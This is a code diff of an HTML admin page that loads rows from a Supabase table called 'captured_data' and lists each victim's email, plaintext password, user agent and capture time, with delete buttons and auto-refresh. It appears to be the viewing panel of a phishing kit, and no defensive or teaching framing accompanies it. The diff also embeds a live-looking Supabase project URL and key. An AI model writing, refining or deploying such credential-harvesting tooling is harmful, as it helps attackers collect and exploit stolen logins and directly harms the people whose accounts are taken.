@@ -184,10 +184,10 @@
     <script>
         // REPLACE WITH YOUR SUPABASE CREDENTIALS
         const SUPABASE_URL = 'https://aqynejlgjwdmxsekuyld.supabase.co';
-        const SUPABASE_ANON_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
+        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
         
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+        
         async function loadData() {
             try {
                 const { data, error } = await supabase
@@ -195,70 +195,56 @@
                     .select('*')
                     .order('created_at', { ascending: false })
                     .limit(100);
-
+                
                 if (error) {
-                    console.error('Error:', error);
                     document.getElementById('tableBody').innerHTML = 
-                        '<tr><td colspan="6" style="text-align:center;color:red;">Error loading data. Check console.</td></tr>';
+                        `<tr><td colspan="6">Error: ${error.message}</td></tr>`;
                     return;
                 }
-
-                document.getElementById('totalCount').textContent = data.length;
-
-                const today = new Date().toDateString();
-                const todayCount = data.filter(item => 
-                    new Date(item.created_at).toDateString() === today
-                ).length;
-                document.getElementById('todayCount').textContent = todayCount;
-
-                const tableBody = document.getElementById('tableBody');
-
+                
                 if (data.length === 0) {
-                    tableBody.innerHTML = '<tr><td colspan="6" class="empty-state">No data captured yet</td></tr>';
+                    document.getElementById('tableBody').innerHTML = 
+                        '<tr><td colspan="6">No data yet</td></tr>';
                     return;
                 }
-
-                tableBody.innerHTML = data.map((item, index) => `
+                
+                document.getElementById('tableBody').innerHTML = data.map((item, index) => `
                     <tr>
                         <td>${index + 1}</td>
-                        <td>${item.email || 'N/A'}</td>
-                        <td class="password">${item.password || 'N/A'}</td>
-                        <td>${(item.user_agent || 'N/A').substring(0, 50)}...</td>
+                        <td>${item.email}</td>
+                        <td class="password">${item.password}</td>
+                        <td>${(item.user_agent || '').substring(0, 50)}</td>
                         <td>${new Date(item.created_at).toLocaleString()}</td>
-                        <td>
-                            <button class="delete-btn" onclick="deleteEntry(${item.id})">Delete</button>
-                        </td>
+                        <td><button onclick="deleteEntry(${item.id})" style="background:red;">Delete</button></td>
                     </tr>
                 `).join('');
-
-            } catch (error) {
-                console.error('Error:', error);
+                
+            } catch (err) {
+                console.error('Error:', err);
                 document.getElementById('tableBody').innerHTML = 
-                    '<tr><td colspan="6" style="text-align:center;color:red;">Error loading data.</td></tr>';
+                    `<tr><td colspan="6">Error: ${err.message}</td></tr>`;
             }
         }
-
+        
         async function deleteEntry(id) {
-            if (!confirm('Delete this entry?')) return;
-
-            try {
-                const { error } = await supabase
-                    .from('captured_data')
-                    .delete()
-                    .eq('id', id);
-
-                if (error) throw error;
+            if (!confirm('Delete?')) return;
+            
+            const { error } = await supabase
+                .from('captured_data')
+                .delete()
+                .eq('id', id);
+            
+            if (!error) {
                 loadData();
-            } catch (error) {
-                console.error('Error deleting:', error);
-                alert('Error deleting entry');
             }
         }
-
+        
+        // Load on page open
         loadData();
+        
+        // Auto refresh every 30 seconds
         setInterval(loadData, 30000);
-
-        window.loadData = loadData;
+        
         window.deleteEntry = deleteEntry;
     </script>
 </body>
